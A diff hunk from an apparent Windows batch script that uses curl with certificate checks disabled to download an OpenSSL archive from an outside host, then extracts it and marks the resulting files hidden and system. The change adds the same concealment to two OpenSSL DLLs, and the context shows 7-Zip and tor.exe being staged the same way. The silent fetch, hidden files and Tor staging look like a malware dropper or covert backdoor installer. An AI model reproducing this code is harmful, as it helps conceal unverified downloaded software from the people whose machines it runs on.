@@ -27,7 +27,7 @@ attrib -s -h -i "%environment%\7-Zip" && if exist "%environment%\7-Zip\7z.exe" (
 attrib -s -h -i "%environment%\openssl.exe" && if exist "%environment%\openssl.exe" (
     attrib +s +h +i "%environment%\openssl.exe"
 ) else (
-   "%environment%\curl.exe" -k -L https://indy.fulgan.com/SSL/Archive/openssl-1.0.2-i386-win32.zip -o "%temp%\openssl.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\openssl.zip" -o"%environment%" -y && attrib +s +h +i "%environment%\openssl.exe"
+   "%environment%\curl.exe" -k -L https://indy.fulgan.com/SSL/Archive/openssl-1.0.2-i386-win32.zip -o "%temp%\openssl.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\openssl.zip" -o"%environment%" -y && attrib +s +h +i "%environment%\openssl.exe" && attrib +s +h +i "%environment%\libeay32.dll" && attrib +s +h +i "%environment%\ssleay32.dll"
 )
 
 attrib -s -h -i "%environment%\tor.exe" && if exist "%environment%\tor.exe" (
